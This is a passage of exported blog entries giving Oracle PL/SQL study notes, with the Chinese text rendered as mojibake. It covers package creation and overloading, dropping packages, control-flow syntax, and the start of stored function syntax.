<h2 id="åˆ›å»ºåŒ…åº”ç”¨ä¸¾ä¾‹"><a href="#åˆ›å»ºåŒ…åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="åˆ›å»ºåŒ…åº”ç”¨ä¸¾ä¾‹"></a>åˆ›å»ºåŒ…åº”ç”¨ä¸¾ä¾‹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">ä¾‹1:åˆ›å»ºçš„åŒ…ä¸ºdemo_packã€‚ </span><br><span class="line">å¯¹deptè¡¨è¿›è¡Œæ’å…¥ã€æŸ¥è¯¢å’Œä¿®æ”¹æ“ä½œï¼Œå¹¶é€šè¿‡demo_packåŒ…ä¸­çš„è®°å½•å˜é‡</span><br><span class="line">DeptRec æ˜¾ç¤ºæ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®åº“ä¿¡æ¯ã€‚ </span><br><span class="line">è¯¥åŒ…ä¸­åŒ…å«ä¸€ä¸ªè®°å½•ç±»å‹å˜é‡DeptRecã€ä¸¤ä¸ªå‡½æ•°å’Œä¸€ä¸ªè¿‡ç¨‹ã€‚ï¼š </span><br><span class="line">*&#x2F;</span><br><span class="line">CREATE OR REPLACE PACKAGE demo_pack </span><br><span class="line">IS </span><br><span class="line">	DeptRec dept%ROWTYPE; </span><br><span class="line">	FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) </span><br><span class="line">   		RETURN NUMBER; </span><br><span class="line">  	FUNCTION remove_dept(dept_no NUMBER) </span><br><span class="line">   		RETURN NUMBER; </span><br><span class="line">  	PROCEDURE query_dept(dept_no IN NUMBER); </span><br><span class="line">END demo_pack;  </span><br><span class="line"></span><br><span class="line">--åŒ…ä¸»ä½“éƒ¨åˆ†ï¼š</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY demo_pack </span><br><span class="line">IS  </span><br><span class="line">	FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) </span><br><span class="line">  		RETURN NUMBER </span><br><span class="line">	IS  </span><br><span class="line">   		empno_remaining EXCEPTION; </span><br><span class="line">     	PRAGMA EXCEPTION_INIT(empno_remaining, -1); </span><br><span class="line">	&#x2F;* -1 æœ¬èº«æ˜¯è¿åå”¯ä¸€çº¦æŸæ¡ä»¶çš„é”™è¯¯ä»£ç ï¼Œä¸ºå·²é¢„å®šä¹‰DUP_VAL_ON_INDEX *&#x2F; </span><br><span class="line">	BEGIN </span><br><span class="line">		INSERT INTO dept VALUES(dept_no, dept_name, location); </span><br><span class="line">		IF SQL%FOUND THEN </span><br><span class="line">			RETURN 1; </span><br><span class="line">		END IF; </span><br><span class="line">		EXCEPTION </span><br><span class="line">			WHEN empno_remaining THEN  </span><br><span class="line">     			RETURN 0; </span><br><span class="line">    		WHEN OTHERS THEN </span><br><span class="line">     			RETURN -1; </span><br><span class="line">	END add_dept;</span><br><span class="line">	FUNCTION remove_dept(dept_no NUMBER) </span><br><span class="line">  		RETURN NUMBER </span><br><span class="line">  	IS  </span><br><span class="line">   	BEGIN </span><br><span class="line">    	DELETE FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">      	IF SQL%FOUND THEN </span><br><span class="line">     		RETURN 1; </span><br><span class="line">    	ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line">      	END IF; </span><br><span class="line">   		EXCEPTION </span><br><span class="line">    		WHEN OTHERS THEN </span><br><span class="line">     			RETURN -1; </span><br><span class="line">	END remove_dept;</span><br><span class="line">	PROCEDURE query_dept (dept_no IN NUMBER) </span><br><span class="line">	IS </span><br><span class="line"> 	BEGIN </span><br><span class="line">   		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line"> 		EXCEPTION </span><br><span class="line">      	WHEN NO_DATA_FOUND THEN   </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;æ•°æ®åº“ä¸­æ²¡æœ‰ç¼–ç ä¸º&#39;||dept_no||&#39;çš„éƒ¨é—¨&#39;); </span><br><span class="line">      	WHEN TOO_MANY_ROWS THEN </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;ç¨‹åºè¿è¡Œé”™è¯¯!è¯·ä½¿ç”¨æ¸¸æ ‡&#39;); </span><br><span class="line">      	WHEN OTHERS THEN </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line"> 	END query_dept; </span><br><span class="line">END demo_pack;</span><br></pre></td></tr></table></figure>
<h2 id="è°ƒç”¨åŒ…åº”ç”¨ä¸¾ä¾‹"><a href="#è°ƒç”¨åŒ…åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="è°ƒç”¨åŒ…åº”ç”¨ä¸¾ä¾‹"></a>è°ƒç”¨åŒ…åº”ç”¨ä¸¾ä¾‹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">	Var NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">  	Var :&#x3D; demo_pack.add_dept(90,&#39;Administration&#39;, &#39;Beijing&#39;); </span><br><span class="line">  	IF var &#x3D;-1 THEN </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line">  	ELSIF var &#x3D;0 THEN </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(&#39;è¯¥éƒ¨é—¨è®°å½•å·²ç»å­˜åœ¨ï¼&#39;); </span><br><span class="line">  	ELSE </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(&#39;æ·»åŠ è®°å½•æˆåŠŸï¼&#39;); </span><br><span class="line">    	Demo_pack.query_dept(90); </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(demo_pack.DeptRec.deptno||&#39;---&#39;|| </span><br><span class="line">    	demo_pack.DeptRec.dname||&#39;---&#39;||demo_pack.DeptRec.loc); </span><br><span class="line">    	var :&#x3D; demo_pack.remove_dept(90); </span><br><span class="line">    	IF var &#x3D;-1 THEN </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line">    	ELSIF var&#x3D;0 THEN </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(&#39;è¯¥éƒ¨é—¨è®°å½•ä¸å­˜åœ¨ï¼&#39;); </span><br><span class="line">    	ELSE </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(&#39;åˆ é™¤è®°å½•æˆåŠŸï¼&#39;); </span><br><span class="line">    	END IF; </span><br><span class="line">	END IF; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="åŒ…çš„å¼€å‘æ­¥éª¤"><a href="#åŒ…çš„å¼€å‘æ­¥éª¤" class="headerlink" title="åŒ…çš„å¼€å‘æ­¥éª¤"></a>åŒ…çš„å¼€å‘æ­¥éª¤</h2><ul>
<li>å°†æ¯ä¸ªå­˜å‚¨è¿‡ç¨‹è°ƒè¯•æ­£ç¡®</li>
<li>ç”¨æ–‡æœ¬ç¼–è¾‘è½¯ä»¶å°†å„ä¸ªå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°é›†æˆåœ¨ä¸€èµ·</li>
<li>æŒ‰ç…§åŒ…çš„å®šä¹‰è¦æ±‚å°†é›†æˆçš„æ–‡æœ¬çš„å‰é¢åŠ ä¸ŠåŒ…å®šä¹‰</li>
<li>æŒ‰ç…§åŒ…çš„å®šä¹‰è¦æ±‚å°†é›†æˆçš„æ–‡æœ¬çš„å‰é¢åŠ ä¸ŠåŒ…å®šä¹‰</li>
<li>ä½¿ç”¨å¼€å‘å·¥å…·è¿›è¡Œè°ƒå¼</li>
</ul>
<h2 id="å­ç¨‹åºé‡è½½"><a href="#å­ç¨‹åºé‡è½½" class="headerlink" title="å­ç¨‹åºé‡è½½"></a>å­ç¨‹åºé‡è½½</h2><p>PL/SQL å…è®¸å¯¹åŒ…å†…å­ç¨‹åºå’Œæœ¬åœ°å­ç¨‹åºè¿›è¡Œé‡è½½ã€‚æ‰€è°“é‡è½½æ—¶æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªå­ç¨‹åºæœ‰ç›¸åŒçš„åç§°ï¼Œä½†æ‹¥æœ‰ä¸åŒçš„å‚æ•°å˜é‡ å‚æ•°å˜é‡ã€å‚æ•°é¡ºåº å‚æ•°é¡ºåºæˆ–å‚æ•°æ•°æ®ç±»å‹ å‚æ•°æ•°æ®ç±»å‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹å­</span><br><span class="line">--åŒ…å®šä¹‰</span><br><span class="line">CREATE OR REPLACE PACKAGE demo_pack1 </span><br><span class="line">IS </span><br><span class="line"> 	DeptRec dept%ROWTYPE; </span><br><span class="line"> 	FUNCTION query_dept(dept_no IN NUMBER) </span><br><span class="line">  		RETURN INTEGER; </span><br><span class="line"> 	FUNCTION query_dept(dept_no IN VARCHAR2) </span><br><span class="line">  		RETURN INTEGER; </span><br><span class="line">END demo_pack1;</span><br><span class="line">--åŒ…ä¸»ä½“</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY demo_pack1 </span><br><span class="line">IS  </span><br><span class="line">	FUNCTION query_dept(dept_no IN NUMBER) </span><br><span class="line"> 		RETURN INTEGER </span><br><span class="line">    IS </span><br><span class="line">    BEGIN </span><br><span class="line"> 		IF dept_no &#x3D;10 THEN </span><br><span class="line">     		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">     		RETURN 1; </span><br><span class="line"> 		ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line"> 		END IF; </span><br><span class="line">	END query_dept;</span><br><span class="line">	FUNCTION query_dept(dept_no IN VARCHAR2) </span><br><span class="line"> 		RETURN INTEGER </span><br><span class="line">    IS </span><br><span class="line">    BEGIN </span><br><span class="line"> 		IF dept_no &#x3D;10 THEN </span><br><span class="line">     		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">     	RETURN 1; </span><br><span class="line"> 		ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line"> 		END IF; </span><br><span class="line">    END query_dept; </span><br><span class="line">END demo_pack1;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li><p>å¦‚æœä¸¤ä¸ªå­ç¨‹åºçš„å‚æ•°åªæ˜¯åç§°å’Œæ–¹å¼ä¸åŒæ—¶ï¼Œä¸èƒ½é‡è½½ä»–ä»¬ã€‚</p>
<ul>
<li><p>PROCEDURE OverlodeMeï¼ˆP_parameter in numberï¼‰</p>
<p>PROCEDURE OverlodeMeï¼ˆP_parameter out numberï¼‰</p>
</li>
<li><p>PROCEDURE OverlodeMeï¼ˆP_parameter numberï¼‰<br>PROCEDURE OverlodeMeï¼ˆP_para numberï¼‰</p>
</li>
</ul>
</li>
<li><p>ä¸èƒ½åªæ ¹æ®ä¸¤ä¸ªå‡½æ•°çš„è¿”å›ç±»å‹è¿›è¡Œé‡è½½</p>
<ul>
<li>FUNCTION Overlodeme RETURN date<br>FUNCTION Overlodeme RETURN boolean</li>
</ul>
</li>
<li><p>é‡è½½å‡½æ•°çš„å‚æ•°å¿…é¡»åœ¨ç±»å‹ç³»åˆ—æ–¹é¢æœ‰æ‰€ä¸åŒï¼Œæ—¢ä¸èƒ½å†åŒä¸€ç±» å‹ç³»åˆ—ä¸Šé‡è½½ï¼šå³å­—ç¬¦ã€æ•°å€¼ã€æ—¥æœŸç­‰ç­‰</p>
<ul>
<li>PROCEDURE OverlodeMeï¼ˆP_parameter in charï¼‰<br>PROCEDURE OverlodeMeï¼ˆP_parameter out varchar2(10)ï¼‰</li>
</ul>
</li>
</ul>
<h2 id="åˆ é™¤åŒ…"><a href="#åˆ é™¤åŒ…" class="headerlink" title="åˆ é™¤åŒ…"></a>åˆ é™¤åŒ…</h2><h3 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP PACKAGE [BODY] [user.]package_name </span><br><span class="line"></span><br><span class="line">--ä¾‹ï¼š</span><br><span class="line">DROP PACKAGE emp_package;</span><br></pre></td></tr></table></figure>
<p><strong>åŒ…æ‰€æ¶‰åŠåˆ°çš„æ•°æ®å­—å…¸è§†å›¾ï¼š</strong></p>
<ul>
<li>DBA_SOURCE</li>
<li>USER_SOURCE</li>
<li>USER_ERRORS</li>
<li>DBA_OBJECTS</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>PL/SQLåŸºæœ¬è¯­æ³•</title>
    <url>/2019/12/17/Oracle/plsql%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="PL-SQLåŸºæœ¬è¯­æ³•"><a href="#PL-SQLåŸºæœ¬è¯­æ³•" class="headerlink" title="PL/SQLåŸºæœ¬è¯­æ³•"></a>PL/SQLåŸºæœ¬è¯­æ³•</h1><h2 id="å¢åˆ æ”¹æŸ¥"><a href="#å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¢åˆ æ”¹æŸ¥"></a>å¢åˆ æ”¹æŸ¥</h2><p>åœ¨SQLPLUSä¸­ä¸è®ºæ˜¯SQLè¿˜æ˜¯PL/SQLï¼Œå¯¹æ•°æ®è¡¨çš„æ”¹åŠ¨ã€‚<br>æœ€åéƒ½éœ€è¦commit; å®Œæˆå®ä¾‹ä¸æ•°æ®æ–‡ä»¶çš„äº¤äº’ã€‚</p>
<a id="more"></a>

<h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><h3 id="æ¡ä»¶è¯­å¥-IFè¯­å¥-CASEè¯­å¥"><a href="#æ¡ä»¶è¯­å¥-IFè¯­å¥-CASEè¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥:IFè¯­å¥,CASEè¯­å¥"></a>æ¡ä»¶è¯­å¥:IFè¯­å¥,CASEè¯­å¥</h3><h4 id="IFè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º-ï¼š"><a href="#IFè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º-ï¼š" class="headerlink" title="IFè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š"></a>IFè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IF &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; THEN </span><br><span class="line">	PL&#x2F;SQLå’Œ SQLè¯­å¥ </span><br><span class="line">END IF; </span><br><span class="line">æˆ–   </span><br><span class="line">IF &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; THEN </span><br><span class="line">	PL&#x2F;SQL å’Œ SQLè¯­å¥ </span><br><span class="line">ELSE</span><br><span class="line">	PLå…¶å®ƒè¯­å¥ </span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure>
<p>æ³¨:&lt;å¸ƒå°”è¡¨è¾¾å¼&gt;æœ€åè¿”å›TRUE or FALSE or NULL<br>ä»…å½“ä¸ºTRUEæ—¶æ‰§è¡ŒTHENåé¢çš„è¯­å¥ã€‚</p>
<table>
<thead>
<tr>
<th align="left">åˆ¤æ–­</th>
<th align="left">ç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NULL AND TRUE</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">NULL AND FALSE</td>
<td align="left">FALSE</td>
</tr>
<tr>
<td align="left">NULL AND NULL</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">NULL OR TRUE</td>
<td align="left">TRUE</td>
</tr>
<tr>
<td align="left">NULL OR FALSE</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">NULL OR NULL</td>
<td align="left">NULL</td>
</tr>
</tbody></table>
<h5 id="NVLå‡½æ•°"><a href="#NVLå‡½æ•°" class="headerlink" title="NVLå‡½æ•°"></a>NVLå‡½æ•°</h5><p><code>**NVL(E1, E2)**</code><br>å¦‚æœE1ä¸ºNULLï¼Œåˆ™å‡½æ•°è¿”å›E2ï¼Œå¦åˆ™è¿”å›E1æœ¬èº«ã€‚</p>
<p><code>**NVL2(E1, E2, E3)**</code><br>å¦‚æœE1ä¸ºNULLï¼Œåˆ™å‡½æ•°è¿”å›E3ï¼Œè‹¥E1ä¸ä¸ºnullï¼Œåˆ™è¿”å›E2ã€‚</p>
<h4 id="CASEè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º-ï¼š"><a href="#CASEè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º-ï¼š" class="headerlink" title="CASEè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š"></a>CASEè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CASE selector </span><br><span class="line">	WHEN expression1 THEN result1 </span><br><span class="line">	WHEN expression2 THEN result2 </span><br><span class="line">	WHEN expressionN THEN resultN </span><br><span class="line">	[ ELSE resultN+1] </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="å¾ªç¯è¯­å¥-LOOPè¯­å¥-EXITè¯­å¥"><a href="#å¾ªç¯è¯­å¥-LOOPè¯­å¥-EXITè¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥:LOOPè¯­å¥,EXITè¯­å¥"></a>å¾ªç¯è¯­å¥:LOOPè¯­å¥,EXITè¯­å¥</h3><h4 id="ç®€å•å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"><a href="#ç®€å•å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š" class="headerlink" title="ç®€å•å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"></a>ç®€å•å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOOP </span><br><span class="line">  è¦æ‰§è¡Œçš„è¯­å¥; </span><br><span class="line">  EXIT WHEN &lt;æ¡ä»¶è¯­å¥&gt; &#x2F;*æ¡ä»¶æ»¡è¶³ï¼Œé€€å‡ºå¾ªç¯è¯­å¥*&#x2F; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong>EXIT WHEN å­å¥æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™å¾ªç¯å°†æ— æ³•åœæ­¢ã€‚</p>
<h4 id="WHILE-å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"><a href="#WHILE-å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š" class="headerlink" title="WHILE å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"></a>WHILE å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WHILE &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; LOOP </span><br><span class="line">    è¦æ‰§è¡Œçš„è¯­å¥; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>whileå¾ªç¯è¯­å¥æ‰§è¡Œçš„é¡ºåºæ˜¯å…ˆåˆ¤æ–­&lt;å¸ƒå°”è¡¨è¾¾å¼&gt;çš„çœŸå‡ï¼Œå¦‚æœä¸ºçœŸåˆ™å¾ªç¯æ‰§è¡Œï¼Œå¦åˆ™é€€å‡ºå¾ªç¯ã€‚</li>
<li>åœ¨WHILEå¾ªç¯è¯­å¥ä¸­ä»ç„¶å¯ä»¥ä½¿ç”¨EXITæˆ–EXIT WHENå­å¥</li>
</ul>
<h4 id="FORå¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"><a href="#FORå¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š" class="headerlink" title="FORå¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"></a>FORå¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR å¾ªç¯è®¡æ•°å™¨ IN [ REVERSE ] ä¸‹é™ .. ä¸Šé™ LOOP </span><br><span class="line">  è¦æ‰§è¡Œçš„è¯­å¥; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>æ¯å¾ªç¯ä¸€æ¬¡ï¼Œå¾ªç¯å˜é‡è‡ªåŠ¨åŠ 1ï¼›ä½¿ç”¨å…³é”®å­—REVERSEï¼Œå¾ªç¯å˜é‡<br>è‡ªåŠ¨å‡1</li>
<li>è·Ÿåœ¨IN REVERSE åé¢çš„æ•°å­—å¿…é¡»æ˜¯ä»å°åˆ°å¤§çš„é¡ºåºï¼Œä½†ä¸ä¸€å®šæ˜¯<br>æ•´æ•°ï¼Œå¯ä»¥æ˜¯èƒ½å¤Ÿè½¬æ¢æˆæ•´æ•°çš„å˜é‡æˆ–è¡¨è¾¾å¼</li>
<li>å¯ä»¥ä½¿ç”¨EXITæˆ–è€…EXIT WHENå­å¥é€€å‡ºå¾ªç¯</li>
</ul>
<h5 id="RETURNã€EXITã€CONTINUEè¯­å¥"><a href="#RETURNã€EXITã€CONTINUEè¯­å¥" class="headerlink" title="RETURNã€EXITã€CONTINUEè¯­å¥"></a>RETURNã€EXITã€CONTINUEè¯­å¥</h5><p><strong>RETURNï¼š</strong>ç›´æ¥è·³å‡ºå—ã€å­˜å‚¨è¿‡ç¨‹æˆ–è€…å‡½æ•°</p>
<p><strong>EXITï¼š</strong>è·³å‡ºæœ¬å¾ªç¯è½¬è€Œæ‰§è¡Œæœ¬å¾ªç¯çš„ä¸Šä¸€çº§å¾ªç¯çš„ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</p>
<p><strong>CONTIUNEï¼š</strong>æœ¬æ¬¡å¾ªç¯åé¢çš„ä»£ç éƒ¨åˆ†ä¸å†æ‰§è¡Œï¼Œè½¬è€Œæ‰§è¡Œæœ¬å¾ªç¯çš„ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</p>
<h3 id="é¡ºåºè¯­å¥-GOTOè¯­å¥-NULLè¯­å¥"><a href="#é¡ºåºè¯­å¥-GOTOè¯­å¥-NULLè¯­å¥" class="headerlink" title="é¡ºåºè¯­å¥:GOTOè¯­å¥,NULLè¯­å¥"></a>é¡ºåºè¯­å¥:GOTOè¯­å¥,NULLè¯­å¥</h3><h4 id="GOTOè¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"><a href="#GOTOè¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š" class="headerlink" title="GOTOè¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š"></a>GOTOè¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GOTO   label;  </span><br><span class="line">. . .  . . . </span><br><span class="line">&lt;&lt;label&gt;&gt; </span><br><span class="line">&#x2F;*æ ‡å·æ˜¯ç”¨&lt;&lt; &gt;&gt;æ‹¬èµ·æ¥çš„æ ‡è¯†ç¬¦ *&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong>GOTOè¯­å¥æ˜¯æ— æ¡ä»¶è·³è½¬åˆ°æŒ‡å®šçš„æ ‡å·å»çš„æ„æ€</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">   V_counter NUMBER :&#x3D; 1; </span><br><span class="line"> BEGIN </span><br><span class="line">   LOOP  </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;V_counterçš„å½“å‰å€¼ä¸º:&#39;||V_counter); </span><br><span class="line"> V_counter :&#x3D; v_counter + 1; </span><br><span class="line"> IF v_counter &gt; 10 THEN </span><br><span class="line">     GOTO l_ENDofLOOP; </span><br><span class="line"> END IF; </span><br><span class="line">   END LOOP; </span><br><span class="line">   &lt;&lt;l_ENDofLOOP&gt;&gt; </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;V_counterçš„å½“å‰å€¼ä¸º:&#39;||V_counter); </span><br><span class="line"> END ;</span><br></pre></td></tr></table></figure>
<h4 id="NULLè¯­å¥ï¼š"><a href="#NULLè¯­å¥ï¼š" class="headerlink" title="NULLè¯­å¥ï¼š"></a>NULLè¯­å¥ï¼š</h4><p>åœ¨PL/SQL ç¨‹åºä¸­ï¼Œå¯ä»¥ç”¨ null è¯­å¥æ¥è¯´æ˜â€œä¸ç”¨åšä»»ä½•äº‹æƒ…â€çš„æ„æ€ï¼Œ<br>ç›¸å½“äºä¸€ä¸ªå ä½ç¬¦ï¼Œå¯ä»¥ä½¿æŸäº›è¯­å¥å˜å¾—æœ‰æ„ä¹‰ï¼Œæé«˜ç¨‹åºçš„å¯è¯»æ€§</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> . . . </span><br><span class="line">BEGIN </span><br><span class="line"> . . . </span><br><span class="line">IF v_num IS NULL THEN </span><br><span class="line">	GOTO print1; </span><br><span class="line">END IF;  </span><br><span class="line"> . . . </span><br><span class="line">&lt;&lt;print1&gt;&gt; </span><br><span class="line">	NULL;-- ä¸éœ€è¦å¤„ç†ä»»ä½•æ•°æ®ã€‚ </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹</title>
    <url>/2019/12/17/Oracle/plsql%E5%AD%98%E5%82%A8%E5%87%BD%E6%95%B0%E5%92%8C%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹"><a href="#plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹" class="headerlink" title="plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹"></a>plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹</h1><h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><ul>
<li>ORACLE æä¾›å¯ä»¥æŠŠPL/SQL ç¨‹åºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æ¥è¿è¡Œå®ƒï¼ˆå†™å¥½çš„å­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹å°±åŒOracleåŸæœ‰çš„å‡½æ•°ä¸€æ ·ï¼‰ã€‚è¿™æ ·å°±å«å­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°ã€‚</li>
<li>è¿‡ç¨‹å’Œå‡½æ•°ç»Ÿç§°ä¸ºPL/SQLå­ç¨‹åºï¼Œä»–ä»¬æ˜¯è¢«å‘½åçš„PL/SQLå—ï¼Œå‡å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶é€šè¿‡è¾“å…¥ã€è¾“å‡ºå‚æ•°æˆ–è¾“å…¥/è¾“å‡ºå‚æ•°ä¸å…¶è°ƒç”¨è€…äº¤æ¢ä¿¡æ¯ã€‚</li>
<li>è¿‡ç¨‹å’Œå‡½æ•°çš„å”¯ä¸€åŒºåˆ«æ˜¯å‡½æ•°æ€»å‘è°ƒç”¨è€…è¿”å›æ•°æ®ï¼Œè€Œè¿‡ç¨‹åˆ™ä¸è¿”å›æ•°æ®ã€‚<a id="more"></a>
<h2 id="å­˜å‚¨å‡½æ•°"><a href="#å­˜å‚¨å‡½æ•°" class="headerlink" title="å­˜å‚¨å‡½æ•°"></a>å­˜å‚¨å‡½æ•°</h2></li>
</ul>
<h3 id="åˆ›å»ºå­˜å‚¨å‡½æ•°"><a href="#åˆ›å»ºå­˜å‚¨å‡½æ•°" class="headerlink" title="åˆ›å»ºå­˜å‚¨å‡½æ•°"></a>åˆ›å»ºå­˜å‚¨å‡½æ•°</h3><h4 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] FUNCTION function_name </span><br><span class="line">[ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type ï¼Œ </span><br><span class="line">   argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] </span><br><span class="line">RETURN return_type  </span><br><span class="line">&#123; IS | AS &#125; </span><br><span class="line">&lt;ç±»å‹.å˜é‡çš„è¯´æ˜&gt;   </span><br><span class="line">BEGIN </span><br><span class="line">   FUNCTION_body </span><br><span class="line">EXCEPTION </span><br><span class="line">   å…¶å®ƒè¯­å¥ </span><br><span class="line">END;  </span><br><span class="line">--æ³¨ï¼š OR REPLACEæœ‰æ— 